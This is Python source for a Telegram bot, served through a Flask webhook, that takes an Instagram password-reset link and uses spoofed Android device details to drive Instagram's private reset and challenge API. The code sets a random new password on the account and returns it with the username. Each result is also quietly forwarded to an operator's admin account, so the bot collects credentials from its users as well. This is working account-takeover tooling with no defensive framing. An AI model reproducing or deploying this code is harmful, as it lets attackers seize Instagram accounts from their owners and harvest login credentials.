import os
import time
import requests
import random
import string
import uuid
from datetime import datetime
from flask import Flask, request
from telebot import TeleBot, types

# ---------- CONFIG ----------
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN environment variable not set!")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))

bot = TeleBot(BOT_TOKEN, parse_mode="HTML")

# ---------- ORIGINAL RESET FUNCTIONS (unchanged) ----------
def generate_device_info():
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; {random.choice(['240dpi','320dpi','480dpi'])}; {random.choice(['720x1280','1080x1920','1440x2560'])}; {random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; {random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; intel; en_US; {random.randint(100000000,999999999)})"
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:Random@{nums}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481"
    }

def id_user(user_id):
    try:
        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
        headers = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
        r = requests.get(url, headers=headers, timeout=10)
        return r.json()["user"]["username"]
    except:
        return "Unknown"

def reset_instagram_password(reset_link):
    start_time = time.time()
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()

        if "uidb36=" not in reset_link or "&token=" not in reset_link:
            return {"success": False, "error": "Invalid reset link"}
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token = reset_link.split("&token=")[1]
        if ":" in token:
            token = token.split(":")[0]

        url1 = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data1 = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": ANDROID_ID,
            "token": token,
            "waterfall_id": WATERFALL_ID
        }
        r1 = requests.post(url1, headers=make_headers(user_agent=USER_AGENT), data=data1, timeout=15)

        if "user_id" not in r1.text:
            return {"success": False, "error": f"Instagram rejected: {r1.text[:200]}"}

        mid = r1.headers.get("Ig-Set-X-Mid")
        resp1 = r1.json()
        user_id = resp1.get("user_id")
        cni = resp1.get("cni")
        nonce_code = resp1.get("nonce_code")
        challenge_context = resp1.get("challenge_context")

        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id": str(user_id),
            "cni": str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        r2_text = requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data2, timeout=15).text

        if f'(bk.action.i64.Const, {cni}), "' not in r2_text.replace('\\', ''):
            return {"success": False, "error": "Challenge extraction failed"}

        challenge_context_final = r2_text.replace('\\', '').split(
            f'(bk.action.i64.Const, {cni}), "')[1].split(
            '", (bk.action.bool.Const, false)))')[0]

        data3 = {
            "is_caa": "False",
            "source": "",
            "uidb36": "",
            "error_state": {"type_name": "str", "index": 0, "state_id": 1048583541},
            "afv": "",
            "cni": str(cni),
            "token": "",
            "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
                                  "styles_id": "instagram"},
            "challenge_context": challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1": PASSWORD,
            "enc_new_password2": PASSWORD
        }
        requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data3, timeout=15)

        elapsed = round(time.time() - start_time, 2)
        new_password = PASSWORD.split(":")[-1]

        return {"success": True, "password": new_password, "user_id": user_id, "time_taken": elapsed}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ---------- TELEGRAM HANDLERS ----------
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, """<b>🔥 Instagram Password Reset Bot</b>\n\nSend me an <b>Instagram reset link</b> and I'll give you the new password in a few seconds.""")

@bot.message_handler(func=lambda m: True)
def handle_link(message):
    link = message.text.strip()

    if not ("uidb36=" in link and "token=" in link):
        bot.reply_to(message, "❌ That doesn't look like a valid reset link.")
        return

    processing = bot.reply_to(message, "⏳ Processing... please wait a few seconds.")

    result = reset_instagram_password(link)

    if result.get("success"):
        user_id = result["user_id"]
        password = result["password"]
        username = id_user(user_id)
        elapsed = result["time_taken"]

        reply = f"""<b>✅ Password Reset Successful!</b>

👤 <b>Username:</b> <code>{username}</code>
🔑 <b>New Password:</b> <code>{password}</code>

⏱ Time: {elapsed}s"""

        if ADMIN_ID:
            try:
                bot.send_message(ADMIN_ID, f"New reset by @{message.from_user.username or message.from_user.id}:\n{reply}")
            except:
                pass
    else:
        reply = f"❌ <b>Reset Failed</b>\n\n<code>{result.get('error')}</code>"

    bot.edit_message_text(reply, message.chat.id, processing.message_id)


# ---------- FLASK APP ----------
app = Flask(__name__)

@app.route('/api/', methods=['POST'])
def webhook_api():
    if request.headers.get('content-type') == 'application/json':
        json_str = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return 'OK', 200
    else:
        return 'Bad content type', 400

@app.route('/api/webhook', methods=['POST'])
def webhook_api2():
    return webhook_api()

@app.route('/api', methods=['POST'])
def webhook_api3():
    return webhook_api()

@app.route('/')
def index():
    return 'Bot is running.'

# For local testing
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000) 
